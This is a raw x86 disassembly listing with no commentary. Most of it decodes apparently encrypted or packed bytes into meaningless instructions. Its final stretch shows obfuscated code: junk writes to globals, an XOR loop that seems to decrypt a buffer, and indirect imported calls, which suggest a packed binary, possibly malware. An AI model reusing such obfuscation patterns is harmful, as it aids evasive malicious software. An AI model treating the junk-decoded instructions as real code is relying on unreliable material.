  41be3f:	add    DWORD PTR [esi],ecx
  41be41:	push   0xfffffff1
  41be43:	call   0x58f26424
  41be48:	sub    DWORD PTR [eax+0x4247182b],esp
  41be4e:	cmp    eax,0x21c2ec8c
  41be53:	inc    esp
  41be54:	sti    
  41be55:	or     ebx,eax
  41be57:	xor    BYTE PTR [edx],al
  41be59:	mov    ebp,0x64e76274
  41be5e:	adc    DWORD PTR [edi-0x26f251c5],0x84a5c87a
  41be68:	imul   edi,DWORD PTR [esi],0x1a
  41be6b:	loope  0x41be66
  41be6d:	push   0xd92bb238
  41be72:	mov    cs,esp
  41be74:	int3   
  41be75:	and    al,BYTE PTR [esi+0x7ae2c2aa]
  41be7b:	int    0x9f
  41be7d:	pop    esi
  41be7e:	adc    BYTE PTR [ebx+ebp*1],0xde
  41be82:	mov    eax,edx
  41be84:	inc    esi
  41be85:	dec    ecx
  41be86:	mov    al,ds:0x37dac37f
  41be8b:	out    dx,eax
  41be8c:	shr    BYTE PTR [edx],1
  41be8e:	jmp    0x41bedd
  41be90:	into   
  41be91:	je     0x41be3c
  41be93:	test   eax,ebp
  41be95:	stos   DWORD PTR es:[edi],eax
  41be96:	(bad)  
  41be97:	dec    edi
  41be98:	inc    ebp
  41be99:	pop    esp
  41be9a:	sub    DWORD PTR [edi+0x6e01e5f6],edi
  41bea0:	mov    edx,0xb0f94f81
  41bea5:	ss into 
  41bea7:	push   edi
  41bea8:	sbb    BYTE PTR [edi-0x5ef8020b],ah
  41beae:	mov    ds:0xcf1e319d,eax
  41beb3:	retf   0x294d
  41beb6:	jbe    0x41bf10
  41beb8:	push   ds
  41beb9:	jl     0x41be4e
  41bebb:	lahf   
  41bebc:	out    0x92,eax
  41bebe:	test   BYTE PTR [edi-0x1694b139],ch
  41bec4:	mov    ecx,DWORD PTR [ecx+ebx*1-0x7052dfb6]
  41becb:	loopne 0x41bf00
  41becd:	mov    edi,0x5de35ab3
  41bed2:	sbb    BYTE PTR [ebx-0x41],0x54
  41bed6:	add    al,0xb3
  41bed8:	cmp    edx,DWORD PTR [ecx+0x12]
  41bedb:	scas   al,BYTE PTR es:[edi]
  41bedc:	int    0xe8
  41bede:	int    0x79
  41bee0:	add    esi,ebp
  41bee2:	adc    al,0xcb
  41bee4:	xchg   DWORD PTR [edx-0x66],esp
  41bee7:	ins    BYTE PTR es:[edi],dx
  41bee8:	jne    0x41bf4f
  41beea:	loop   0x41bf42
  41beec:	push   edx
  41beed:	fcomp  st(6)
  41beef:	(bad)  
  41bef2:	mov    DWORD PTR [eax+0x1e7f5d3f],eax
  41bef8:	or     DWORD PTR [eax+0x73],eax
  41befb:	mov    ebx,0xb750b43b
  41bf00:	js     0x41bf26
  41bf02:	sub    eax,0xc7cf836e
  41bf07:	xor    eax,0xc0a9c69b
  41bf0c:	outs   dx,DWORD PTR ds:[esi]
  41bf0d:	dec    edi
  41bf0e:	inc    edi
  41bf0f:	push   ds
  41bf10:	scas   al,BYTE PTR es:[edi]
  41bf11:	test   BYTE PTR [ebp+0x318ca112],ch
  41bf17:	dec    ebp
  41bf18:	cmp    BYTE PTR [edx],ch
  41bf1a:	xor    bh,BYTE PTR [ecx]
  41bf1c:	and    al,0xe1
  41bf1e:	or     DWORD PTR [edi+0x4c],esi
  41bf21:	sbb    al,0x6d
  41bf23:	cdq    
  41bf24:	dec    ecx
  41bf25:	jmp    0x41bf38
  41bf27:	sbb    eax,0x79856fa8
  41bf2c:	aas    
  41bf2d:	loope  0x41bf15
  41bf2f:	cs pop ebx
  41bf31:	(bad)  
  41bf32:	cmova  esi,DWORD PTR ds:0x47a069a7
  41bf39:	jmp    0x91b4:0x5f173688
  41bf40:	mov    ah,0x23
  41bf42:	push   ebx
  41bf43:	ret    
  41bf44:	sub    BYTE PTR [edi-0x3d],bl
  41bf47:	enter  0x4445,0xe5
  41bf4b:	outs   dx,DWORD PTR ss:[esi]
  41bf4d:	aad    0x8
  41bf4f:	aad    0xb0
  41bf51:	in     al,dx
  41bf52:	test   edx,0x3e95239c
  41bf58:	fist   DWORD PTR [edi-0x52a7c3ed]
  41bf5e:	fstp   QWORD PTR [edx-0x5b]
  41bf61:	or     al,cl
  41bf63:	(bad)  
  41bf64:	mov    es,WORD PTR [ebp+0x38]
  41bf67:	retf   0xee2f
  41bf6a:	xlat   BYTE PTR ds:[ebx]
  41bf6b:	in     eax,0x7c
  41bf6d:	jge    0x41bf98
  41bf6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf70:	das    
  41bf71:	idiv   esp
  41bf73:	out    dx,al
  41bf74:	imul   edx,DWORD PTR [esi-0xc],0x3edc90bf
  41bf7b:	retf   0xe4cf
  41bf7e:	jp     0x41bf98
  41bf80:	xor    cl,al
  41bf82:	and    BYTE PTR [ecx+0x8],0x92
  41bf86:	ss icebp 
  41bf88:	jo     0x41bf85
  41bf8a:	or     ebx,edi
  41bf8c:	push   edi
  41bf8d:	cmp    edx,0xfffffffb
  41bf90:	fdiv   QWORD PTR [eax+eiz*2]
  41bf93:	dec    edi
  41bf94:	js     0x41bf47
  41bf96:	daa    
  41bf97:	mov    ah,0x2a
  41bf99:	sub    eax,0xe62e9d75
  41bf9e:	gs xchg edx,eax
  41bfa0:	xchg   ecx,eax
  41bfa1:	mov    bl,0x5e
  41bfa3:	push   esp
  41bfa4:	or     al,BYTE PTR ds:0x6eac5bb9
  41bfaa:	cmp    DWORD PTR [esi+0x4b],0x21836f3a
  41bfb1:	push   ebp
  41bfb2:	gs in  eax,0x69
  41bfb5:	(bad)  [esi-0x34427685]
  41bfbb:	fcom   DWORD PTR [esi+0xd]
  41bfbe:	(bad)  
  41bfbf:	xlat   BYTE PTR ds:[ebx]
  41bfc0:	inc    ebp
  41bfc1:	and    BYTE PTR [esp+ebp*1-0x6ea6998e],al
  41bfc8:	cmp    BYTE PTR [ebx-0x1e1bcf17],al
  41bfce:	enter  0xb72c,0x8d
  41bfd2:	scas   al,BYTE PTR es:[edi]
  41bfd3:	push   ds
  41bfd4:	cmp    bh,BYTE PTR [esi+0xa1c6dd2]
  41bfda:	push   0xffffffe4
  41bfdc:	loope  0x41bfb5
  41bfde:	in     eax,dx
  41bfdf:	in     eax,0x5f
  41bfe1:	xchg   esi,eax
  41bfe2:	lahf   
  41bfe3:	mov    ?,WORD PTR [eax]
  41bfe5:	push   esp
  41bfe6:	test   cl,ch
  41bfe8:	int3   
  41bfe9:	inc    edx
  41bfea:	in     al,0xa5
  41bfec:	push   ecx
  41bfed:	repz adc ebp,DWORD PTR [edi-0x1c98ce36]
  41bff4:	mov    ah,BYTE PTR [eax-0x7d6bd20a]
  41bffa:	add    eax,0xd3dff89e
  41bfff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c000:	or     DWORD PTR [edi+0x7e],0x83b806eb
  41c007:	push   esp
  41c008:	pop    ebp
  41c009:	pop    esp
  41c00a:	(bad)  
  41c00b:	cmp    al,0xcb
  41c00d:	cmp    al,0x43
  41c00f:	adc    ah,BYTE PTR ds:0x33a2c2bf
  41c015:	sti    
  41c016:	xor    dl,BYTE PTR [ebp+0x53455e3c]
  41c01c:	iret   
  41c01d:	pop    edx
  41c01e:	add    eax,0x7c6a07e5
  41c023:	sbb    DWORD PTR [eax-0x7a],edx
  41c026:	cmp    al,0x29
  41c028:	push   0xffffff9f
  41c02a:	je     0x41c04d
  41c02c:	push   edi
  41c02d:	cmp    BYTE PTR [esi+0x5a],dh
  41c030:	stos   BYTE PTR es:[edi],al
  41c031:	aam    0xb0
  41c033:	xchg   DWORD PTR [ebx],ebp
  41c035:	inc    esi
  41c036:	xor    BYTE PTR [esp+eiz*8+0x3a],bl
  41c03a:	xlat   BYTE PTR ds:[ebx]
  41c03b:	add    al,0xaa
  41c03d:	test   dh,ah
  41c03f:	adc    eax,0xde7da622
  41c044:	push   0xffffff83
  41c046:	add    BYTE PTR [ebp+0x78],al
  41c049:	and    al,ch
  41c04b:	xchg   ebx,eax
  41c04c:	fxtract 
  41c04e:	dec    esi
  41c04f:	mov    es,WORD PTR [ebx+eiz*4-0x4c]
  41c053:	mov    bl,0x3
  41c055:	js     0x41c09c
  41c057:	ins    BYTE PTR es:[edi],dx
  41c058:	dec    edi
  41c059:	adc    cl,BYTE PTR [ebx+eax*8-0x315844e0]
  41c060:	xchg   edx,eax
  41c061:	push   esp
  41c062:	retf   
  41c063:	bound  edx,QWORD PTR [ecx-0x509d98e1]
  41c069:	and    BYTE PTR [ebx+0x1cf68f36],cl
  41c06f:	ss xchg ebx,eax
  41c072:	js     0x41c045
  41c074:	inc    edx
  41c075:	sar    BYTE PTR [ebx+0x4f9a24e0],1
  41c07b:	pop    es
  41c07c:	ds xor cl,al
  41c07f:	pop    edx
  41c080:	dec    ebp
  41c081:	inc    esp
  41c082:	sbb    eax,0x666b3664
  41c087:	fs pop edi
  41c089:	inc    esi
  41c08a:	pushf  
  41c08b:	fnstcw WORD PTR [eax]
  41c08d:	imul   esi,DWORD PTR [edi-0x77],0xffffff90
  41c091:	(bad)  
  41c092:	nop
  41c093:	test   DWORD PTR [ebx+0x174a242d],ebp
  41c099:	mov    ebp,0xe506c8b2
  41c09e:	jmp    0x9ae3:0x1a5e24eb
  41c0a5:	fld    DWORD PTR [esi-0x7cd9a7c]
  41c0ab:	push   ss
  41c0ac:	push   edi
  41c0ad:	dec    esp
  41c0ae:	cmp    dl,BYTE PTR [ebp+0xc1f405e]
  41c0b4:	ror    ch,0x9a
  41c0b7:	inc    esi
  41c0b8:	mov    bl,0x27
  41c0ba:	inc    ecx
  41c0bb:	xor    BYTE PTR [ebx+0x3b],dl
  41c0be:	ja     0x41c09c
  41c0c0:	dec    ebx
  41c0c1:	test   al,0x16
  41c0c3:	enter  0x83d7,0xb0
  41c0c7:	pushf  
  41c0c8:	sub    al,0x5b
  41c0ca:	sbb    cl,BYTE PTR [ecx-0x5079edf]
  41c0d0:	ficomp WORD PTR [edi-0x6b]
  41c0d3:	sub    eax,0xa561006e
  41c0d8:	(bad)  
  41c0d9:	jns    0x41c0ce
  41c0db:	jno    0x41c153
  41c0dd:	mov    edx,0x6e9ffb9b
  41c0e2:	jbe    0x41c073
  41c0e4:	mov    DWORD PTR [ebp-0x6c9ee850],edx
  41c0ea:	(bad)  
  41c0eb:	mov    al,ds:0xfb04e80c
  41c0f0:	(bad)  
  41c0f1:	and    bl,ch
  41c0f3:	sbb    ebx,esi
  41c0f5:	mov    esi,0x34efde80
  41c0fa:	xor    eax,0x89d44d5
  41c0ff:	cwde   
  41c100:	and    DWORD PTR [edx+eax*2],eax
  41c103:	push   edi
  41c104:	sahf   
  41c105:	clc    
  41c106:	into   
  41c107:	int    0xa9
  41c109:	cmp    dl,ch
  41c10b:	mov    dl,0xd8
  41c10d:	shl    DWORD PTR [eax],cl
  41c10f:	sar    DWORD PTR [eax+edx*4+0x2ac61c49],1
  41c116:	sbb    BYTE PTR [esi+0x78],0x24
  41c11a:	and    ch,BYTE PTR [edi+0x38d877a]
  41c120:	push   0xeaec4e46
  41c125:	icebp  
  41c126:	fwait
  41c127:	xor    al,0x3
  41c129:	es add eax,0xc5d0afe2
  41c12f:	cmp    eax,0x3be90ca2
  41c134:	xchg   BYTE PTR [ebp-0x26b24ba9],al
  41c13a:	rcr    DWORD PTR [edi-0x1e0bbabe],0xff
  41c141:	jl     0x41c11b
  41c143:	mov    eax,0x76fe3155
  41c148:	cld    
  41c149:	out    0x1b,al
  41c14b:	aas    
  41c14c:	scas   al,BYTE PTR es:[edi]
  41c14d:	mov    ds:0xdf7735f4,al
  41c152:	xchg   esp,eax
  41c153:	fcomp  DWORD PTR [eax+0xe]
  41c156:	pop    ecx
  41c157:	push   0x5444f1e9
  41c15c:	call   0xadadcf76
  41c161:	les    ebx,FWORD PTR ds:[ebx+0x1f]
  41c165:	je     0x41c10f
  41c167:	rcl    bh,1
  41c169:	test   bl,bl
  41c16b:	js     0x41c1ad
  41c16d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c16e:	push   eax
  41c16f:	sbb    esi,DWORD PTR ds:0x8444ac81
  41c175:	lods   eax,DWORD PTR ds:[esi]
  41c176:	sub    eax,0xd2a2c44e
  41c17b:	repz adc bl,ah
  41c17e:	push   cs
  41c17f:	mov    DWORD PTR [ecx],0xfdd0d369
  41c185:	hlt    
  41c186:	rol    eax,0xe9
  41c189:	and    DWORD PTR [eax+edx*2],0xcd5f0361
  41c190:	lods   al,BYTE PTR ds:[esi]
  41c191:	add    DWORD PTR [edi+eiz*4],ecx
  41c194:	neg    BYTE PTR ds:[ebx-0x564d633a]
  41c19b:	sti    
  41c19c:	jne    0x41c192
  41c19e:	push   esp
  41c19f:	loopne 0x41c1b2
  41c1a1:	fsubr  QWORD PTR [edi+edx*1-0x2c0d6fb8]
  41c1a8:	fadd   st,st(5)
  41c1aa:	lahf   
  41c1ab:	adc    ebp,DWORD PTR [ebx-0x1cd818b2]
  41c1b1:	cli    
  41c1b2:	pop    ds
  41c1b3:	pop    esp
  41c1b4:	push   esi
  41c1b5:	push   esp
  41c1b6:	jns    0x41c223
  41c1b8:	aas    
  41c1b9:	xor    bh,BYTE PTR [ebx-0x5c829466]
  41c1bf:	addr16 sbb ax,0x1971
  41c1c4:	aaa    
  41c1c5:	mov    dh,0xc
  41c1c7:	mov    dh,0x9
  41c1c9:	mov    eax,ds:0x8f2f08fe
  41c1ce:	and    edi,DWORD PTR [ebx-0x1a]
  41c1d1:	mov    al,0x44
  41c1d3:	and    eax,0x4ffabbc9
  41c1d8:	dec    ecx
  41c1d9:	xlat   BYTE PTR ds:[ebx]
  41c1da:	clc    
  41c1db:	adc    BYTE PTR [ebx],ah
  41c1dd:	xchg   esp,eax
  41c1de:	jnp    0x41c168
  41c1e0:	das    
  41c1e1:	mov    ss,WORD PTR [esi-0x467426e0]
  41c1e7:	push   es
  41c1e8:	sub    DWORD PTR [esp+ecx*2-0x59],ecx
  41c1ec:	cmp    BYTE PTR [eax+0x13a967e2],0xa1
  41c1f3:	sbb    al,0xc1
  41c1f5:	aas    
  41c1f6:	sub    DWORD PTR fs:[eax],0xfffffff3
  41c1fa:	mov    cl,0xe8
  41c1fc:	hlt    
  41c1fd:	in     eax,0xc8
  41c1ff:	mov    ecx,0xd752035a
  41c204:	rcr    BYTE PTR [ebx+ebx*8+0x33],cl
  41c208:	cdq    
  41c209:	mov    esi,0x88847fcd
  41c20e:	push   eax
  41c20f:	pop    es
  41c210:	pop    ecx
  41c211:	(bad)  
  41c212:	loope  0x41c254
  41c214:	mov    dh,0x9d
  41c216:	lods   eax,DWORD PTR ds:[esi]
  41c217:	and    BYTE PTR [edi],0xfb
  41c21a:	into   
  41c21b:	test   DWORD PTR [edx+0x157571fa],ebp
  41c221:	push   ebx
  41c222:	adc    ecx,edx
  41c224:	mov    ch,dh
  41c226:	adc    al,0x83
  41c228:	dec    esp
  41c229:	into   
  41c22a:	pop    esp
  41c22b:	test   DWORD PTR [ebx-0x26],eax
  41c22e:	aaa    
  41c22f:	mov    ah,0x57
  41c231:	pop    esi
  41c232:	add    al,0xd5
  41c234:	mov    ebx,0x5d0813ef
  41c239:	pop    eax
  41c23a:	xor    dh,BYTE PTR [esi*4-0x2246def]
  41c241:	pop    es
  41c242:	int    0xca
  41c244:	mov    ecx,0x6b00554c
  41c249:	mov    eax,ds:0x17a83d0b
  41c24e:	rcr    BYTE PTR [edi+0x7b92cc6a],1
  41c254:	mov    bl,0x97
  41c256:	jecxz  0x41c275
  41c258:	lods   eax,DWORD PTR ds:[esi]
  41c259:	pop    es
  41c25a:	mov    bl,0xe6
  41c25c:	(bad)  
  41c25d:	xchg   esi,eax
  41c25e:	add    BYTE PTR [ebx],0xb
  41c261:	stos   DWORD PTR es:[edi],eax
  41c262:	jo     0x41c250
  41c264:	jle    0x41c252
  41c266:	aas    
  41c267:	push   ecx
  41c268:	in     eax,0x6f
  41c26a:	add    al,0xb8
  41c26c:	xor    al,0xbf
  41c26e:	mov    esp,0x5aa28173
  41c273:	std    
  41c274:	mov    bl,0xad
  41c276:	inc    esi
  41c277:	cmp    DWORD PTR [edx+0x6a],eax
  41c27a:	inc    edi
  41c27b:	(bad)  
  41c27c:	std    
  41c27d:	fisubr DWORD PTR [eax-0x3a108f61]
  41c283:	inc    esp
  41c284:	mov    BYTE PTR [eax+eax*1],bl
  41c287:	fadd   QWORD PTR [eax]
  41c289:	cdq    
  41c28a:	push   ds
  41c28b:	jno    0x41c24b
  41c28d:	cli    
  41c28e:	ret    0xa267
  41c291:	ja     0x41c22b
  41c293:	dec    edx
  41c294:	js     0x41c248
  41c296:	mov    ecx,0x94cd387
  41c29b:	jge    0x41c2ce
  41c29d:	xchg   bp,ax
  41c29f:	in     al,0x5c
  41c2a1:	cmp    ecx,edi
  41c2a3:	sar    BYTE PTR [ebx],0x99
  41c2a6:	pop    ecx
  41c2a7:	pushf  
  41c2a8:	pop    ebp
  41c2a9:	dec    ebp
  41c2aa:	invd   
  41c2ac:	pop    ss
  41c2ad:	pushf  
  41c2ae:	dec    ebx
  41c2af:	int    0xc6
  41c2b1:	jle    0x41c2bf
  41c2b3:	jecxz  0x41c330
  41c2b5:	or     ecx,esi
  41c2b7:	out    0x10,al
  41c2b9:	adc    ecx,DWORD PTR [eax+0x7d]
  41c2bc:	add    al,0x66
  41c2be:	add    DWORD PTR [ecx],eax
  41c2c0:	xchg   ebp,eax
  41c2c1:	outs   dx,BYTE PTR ds:[esi]
  41c2c2:	mov    cl,BYTE PTR [ebp-0x508e7a57]
  41c2c8:	jbe    0x41c348
  41c2ca:	loopne 0x41c284
  41c2cc:	pop    edx
  41c2cd:	test   BYTE PTR [edi],bl
  41c2cf:	in     eax,0x14
  41c2d1:	jae    0x41c322
  41c2d3:	stos   BYTE PTR es:[edi],al
  41c2d4:	push   esp
  41c2d5:	inc    esi
  41c2d6:	cmp    DWORD PTR [edx+eax*4],ebx
  41c2d9:	cmp    BYTE PTR [esi-0x21167280],0xb4
  41c2e0:	jmp    0xf15a5f47
  41c2e5:	or     DWORD PTR [edx+0x4],edx
  41c2e8:	xchg   ebx,eax
  41c2e9:	out    0x28,eax
  41c2eb:	pop    ebx
  41c2ec:	mov    ecx,0x8477c8e5
  41c2f1:	and    DWORD PTR [edi-0x2a16e3],esp
  41c2f7:	mov    ch,0x20
  41c2f9:	fwait
  41c2fa:	imul   ebx,DWORD PTR [ebx+0x7c42d66e],0xf3c990d2
  41c304:	jl     0x41c30f
  41c306:	sub    eax,0xb231a9e9
  41c30b:	and    dl,cl
  41c30d:	mov    DWORD PTR [ecx+0x4d84734b],esi
  41c313:	out    dx,al
  41c314:	ins    DWORD PTR es:[edi],dx
  41c315:	cmp    al,0xf2
  41c317:	push   esi
  41c318:	imul   ecx,edx,0x63
  41c31b:	gs or  al,0x88
  41c31e:	xchg   ecx,eax
  41c31f:	sbb    BYTE PTR [ecx],al
  41c321:	cmp    ch,BYTE PTR [ecx-0x5b]
  41c324:	and    BYTE PTR [edi],bh
  41c326:	cmp    BYTE PTR [esi-0x3faffcb1],cl
  41c32c:	shl    eax,cl
  41c32e:	aaa    
  41c32f:	jmp    0x4892:0xd0f4fd1d
  41c336:	lods   eax,DWORD PTR ds:[esi]
  41c337:	adc    eax,0x53025944
  41c33c:	ins    DWORD PTR es:[edi],dx
  41c33d:	pop    esp
  41c33e:	jecxz  0x41c33b
  41c340:	cmp    esp,DWORD PTR [edi+0x951b501]
  41c346:	test   bh,bh
  41c348:	add    ah,BYTE PTR [ebx+0x78]
  41c34b:	adc    DWORD PTR [esi+0x77],esp
  41c34e:	dec    ebx
  41c34f:	ds lahf 
  41c351:	sahf   
  41c352:	stos   BYTE PTR es:[edi],al
  41c353:	repz sbb eax,0xaddeaccf
  41c359:	lahf   
  41c35a:	jo     0x41c35f
  41c35c:	and    BYTE PTR [edx],dl
  41c35e:	retf   0x22f8
  41c361:	inc    ebp
  41c362:	xchg   edi,eax
  41c363:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c364:	inc    ebx
  41c365:	adc    al,0x23
  41c367:	jno    0x41c36c
  41c369:	ud1    edi,DWORD PTR [esi]
  41c36c:	rcl    DWORD PTR [ebp-0x72],0x89
  41c370:	xor    ebp,DWORD PTR [ecx]
  41c372:	into   
  41c373:	jnp    0x41c33e
  41c375:	xchg   edi,eax
  41c376:	enter  0x770f,0x15
  41c37a:	repnz arpl WORD PTR [esi-0x63],si
  41c37e:	nop
  41c37f:	popf   
  41c380:	call   0x9c7526a
  41c385:	popf   
  41c386:	mov    al,ds:0xd4d5cb53
  41c38b:	pop    edx
  41c38c:	jmp    0xc754:0xdcc1bf29
  41c393:	aad    0x33
  41c395:	stos   DWORD PTR es:[edi],eax
  41c396:	sub    DWORD PTR [ebx],edi
  41c398:	nop
  41c399:	xor    ebx,ecx
  41c39b:	fmulp  st(3),st
  41c39d:	pop    edi
  41c39e:	pop    ds
  41c39f:	shl    ebx,1
  41c3a1:	push   ss
  41c3a2:	inc    ecx
  41c3a3:	pop    ebx
  41c3a4:	push   edi
  41c3a5:	jne    0x41c3da
  41c3a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3a8:	mov    esp,0x60982d76
  41c3ad:	xor    bh,BYTE PTR [ecx]
  41c3af:	pop    edi
  41c3b0:	rcl    BYTE PTR [ecx+0x74],cl
  41c3b3:	test   BYTE PTR [ecx+0x69a218aa],ch
  41c3b9:	and    al,0x15
  41c3bb:	or     bh,bl
  41c3bd:	stos   BYTE PTR es:[edi],al
  41c3be:	jae    0x41c370
  41c3c0:	adc    BYTE PTR [edx],ah
  41c3c2:	jle    0x41c34f
  41c3c4:	mov    ?,WORD PTR [eax]
  41c3c6:	sbb    al,0x86
  41c3c8:	mov    DWORD PTR [ecx+0x8a85],edi
  41c3ce:	sbb    DWORD PTR ds:0x42c00c,0x42a01c
  41c3d8:	xor    cx,WORD PTR [edi+edx*4+0x2]
  41c3dd:	and    DWORD PTR ds:0x428004,0x297a
  41c3e7:	mov    edi,0x3b4b
  41c3ec:	add    DWORD PTR ds:0x42901c,0x4e21
  41c3f6:	add    cx,di
  41c3f9:	and    DWORD PTR ds:0x428024,0x9b5
  41c403:	movzx  ecx,cx
  41c406:	not    DWORD PTR ds:0x42801c
  41c40c:	mov    DWORD PTR [ebp-0x10],ecx
  41c40f:	and    ecx,DWORD PTR ds:0x42a01c
  41c415:	mov    ecx,DWORD PTR [ebp+0x8]
  41c418:	movzx  ecx,WORD PTR [ecx+edx*4]
  41c41c:	xor    ecx,0x8a85
  41c422:	add    ecx,edi
  41c424:	mov    edi,0x7b07
  41c429:	mov    edi,DWORD PTR [ebp-0x10]
  41c42c:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  41c433:	inc    edx
  41c434:	mov    DWORD PTR ds:0x428024,0x7111
  41c43e:	mov    ecx,DWORD PTR [ebp-0x18]
  41c441:	mov    DWORD PTR ds:0x42a014,0x7e65
  41c44b:	cmp    edx,ecx
  41c44d:	mov    DWORD PTR ds:0x42c01c,0x291f
  41c457:	jne    0x41a04b
  41c45d:	mov    ecx,DWORD PTR [ebp-0x14]
  41c460:	add    DWORD PTR ds:0x42c008,edi
  41c466:	mov    edx,DWORD PTR [ebp+0x10]
  41c469:	xor    ecx,eax
  41c46b:	add    DWORD PTR ds:0x42a014,0x777
  41c475:	add    ecx,esi
  41c477:	mov    DWORD PTR [edx],ecx
  41c479:	or     DWORD PTR ds:0x42c014,edi
  41c47f:	mov    ecx,DWORD PTR [ebp-0x14]
  41c482:	xor    ecx,eax
  41c484:	add    ecx,esi
  41c486:	mov    DWORD PTR [ebp-0x20],ecx
  41c489:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  41c490:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  41c497:	mov    DWORD PTR ds:0x42a000,0x393
  41c4a1:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  41c4a8:	movzx  ecx,WORD PTR ds:0x42a008
  41c4af:	mov    ecx,DWORD PTR [ebp-0xc]
  41c4b2:	mov    DWORD PTR [ebp+0x8],ecx
  41c4b5:	jmp    0x41c6f7
  41c4ba:	mov    ecx,DWORD PTR ds:0x428024
  41c4c0:	add    DWORD PTR ds:0x429008,ecx
  41c4c6:	mov    ecx,DWORD PTR [ebp+0x8]
  41c4c9:	sbb    edx,DWORD PTR ds:0x429018
  41c4cf:	mov    edx,DWORD PTR [ebp-0x8]
  41c4d2:	or     DWORD PTR ds:0x429010,0x42a010
  41c4dc:	xor    ecx,eax
  41c4de:	xor    edx,eax
  41c4e0:	adc    DWORD PTR ds:0x42a014,0x429000
  41c4ea:	sub    ecx,edx
  41c4ec:	adc    edx,DWORD PTR ds:0x42b010
  41c4f2:	sub    ecx,esi
  41c4f4:	mov    DWORD PTR ds:0x428018,0x60a2
  41c4fe:	xor    ecx,eax
  41c500:	mov    DWORD PTR [ebp+0x8],ecx
  41c503:	and    ecx,0x319e
  41c509:	mov    ecx,DWORD PTR [ebp+0x8]
  41c50c:	or     edx,DWORD PTR ds:0x428008
  41c512:	mov    edx,DWORD PTR [ebp-0x64]
  41c515:	lea    ecx,[edx+ecx*1+0x5708f5]
  41c51c:	mov    DWORD PTR [ebp-0x64],ecx
  41c51f:	or     DWORD PTR ds:0x42901c,0xdce
  41c529:	mov    ecx,DWORD PTR [ebp+0x8]
  41c52c:	movzx  edx,BYTE PTR ds:0x429000
  41c533:	xor    DWORD PTR ds:0x42c004,edx
  41c539:	mov    edx,DWORD PTR [ebp-0x60]
  41c53c:	lea    ecx,[edx+ecx*1+0x5708f5]
  41c543:	not    edx
  41c545:	mov    DWORD PTR [ebp-0x60],ecx
  41c548:	xor    ecx,ecx
  41c54a:	or     ecx,DWORD PTR ds:0x428008
  41c550:	adc    ecx,DWORD PTR ds:0x42901c
  41c556:	mov    DWORD PTR ds:0x428008,ecx
  41c55c:	mov    ecx,DWORD PTR [ebp+0x8]
  41c55f:	and    DWORD PTR ds:0x42b018,0x0
  41c569:	mov    edx,DWORD PTR ds:0x42b018
  41c56f:	inc    edx
  41c570:	mov    DWORD PTR ds:0x42b018,edx
  41c576:	cmp    DWORD PTR ds:0x42b018,0x1b
  41c57d:	jne    0x41c5ad
  41c583:	push   0x42c004
  41c588:	push   0x28d8
  41c58d:	push   0x39eb
  41c592:	push   0x42801c
  41c597:	push   0x11e7
  41c59c:	push   0x4234de
  41c5a1:	push   DWORD PTR [ebp-0x1c]
  41c5a4:	push   DWORD PTR [ebp-0x1c]
  41c5a7:	call   DWORD PTR ds:0x424024
  41c5ad:	cmp    DWORD PTR ds:0x42b018,0x17
  41c5b4:	jb     0x41c569
  41c5ba:	or     DWORD PTR ds:0x42a018,0x7d26
  41c5c4:	mov    edx,DWORD PTR [ebp-0x5c]
  41c5c7:	sbb    DWORD PTR ds:0x42c008,0x428018
  41c5d1:	lea    ecx,[edx+ecx*1+0x5708f4]
  41c5d8:	and    DWORD PTR ds:0x42c00c,edx
  41c5de:	mov    DWORD PTR [ebp-0x5c],ecx
  41c5e1:	and    edx,0x6d7b
  41c5e7:	mov    ecx,DWORD PTR [ebp+0x8]
  41c5ea:	mov    edx,DWORD PTR [ebp-0x58]
  41c5ed:	mov    DWORD PTR ds:0x428028,0xea2
  41c5f7:	lea    ecx,[edx+ecx*1+0x5708fb]
  41c5fe:	mov    DWORD PTR [ebp-0x58],ecx
  41c601:	mov    DWORD PTR ds:0x429010,0x14
  41c60b:	cmp    DWORD PTR ds:0x429010,0x0
  41c612:	je     0x41c6a5
  41c618:	cmp    DWORD PTR ds:0x429010,0x4
  41c61f:	jne    0x41c636
  41c625:	push   0x3e6d
  41c62a:	push   DWORD PTR [ebp-0x28]
  41c62d:	push   DWORD PTR [ebp-0x10]
  41c630:	call   DWORD PTR ds:0x424028
  41c636:	cmp    DWORD PTR ds:0x429010,0x5
  41c63d:	jne    0x41c652
  41c643:	xor    edx,edx
  41c645:	add    edx,DWORD PTR ds:0x429010
  41c64b:	dec    edx
  41c64c:	mov    DWORD PTR ds:0x429010,edx
  41c652:	mov    edx,DWORD PTR ds:0x429010
  41c658:	dec    edx
  41c659:	mov    DWORD PTR ds:0x429010,edx
  41c65f:	jmp    0x41c60b
  41c664:	and    DWORD PTR ds:0x428018,0x0
  41c66e:	mov    edx,DWORD PTR ds:0x428018
  41c674:	inc    edx
  41c675:	mov    DWORD PTR ds:0x428018,edx
  41c67b:	cmp    DWORD PTR ds:0x428018,0x20
  41c682:	jne    0x41c698
  41c688:	push   0x4235ed
  41c68d:	push   0x423604
  41c692:	call   DWORD PTR ds:0x424030
  41c698:	cmp    DWORD PTR ds:0x428018,0x19
  41c69f:	jb     0x41c66e
  41c6a5:	mov    ecx,DWORD PTR [ebp+0x8]
  41c6a8:	mov    edx,DWORD PTR [ebp-0x54]
  41c6ab:	adc    DWORD PTR ds:0x429000,0x42b000
  41c6b5:	lea    ecx,[edx+ecx*1+0x5708fa]
  41c6bc:	mov    DWORD PTR [ebp-0x54],ecx
  41c6bf:	not    edx
  41c6c1:	mov    ecx,DWORD PTR [ebp+0x8]
  41c6c4:	mov    edx,DWORD PTR ds:0x42901c
  41c6ca:	and    edx,DWORD PTR ds:0x42c004
  41c6d0:	mov    DWORD PTR ds:0x42901c,edx
  41c6d6:	mov    edx,DWORD PTR [ebp-0x50]
  41c6d9:	sbb    DWORD PTR ds:0x428010,0x6c9
  41c6e3:	lea    ecx,[edx+ecx*1+0x5708f9]
  41c6ea:	or     DWORD PTR ds:0x42c018,0x5b89
  41c6f4:	mov    DWORD PTR [ebp-0x50],ecx
  41c6f7:	mov    ecx,DWORD PTR [ebp+0x8]
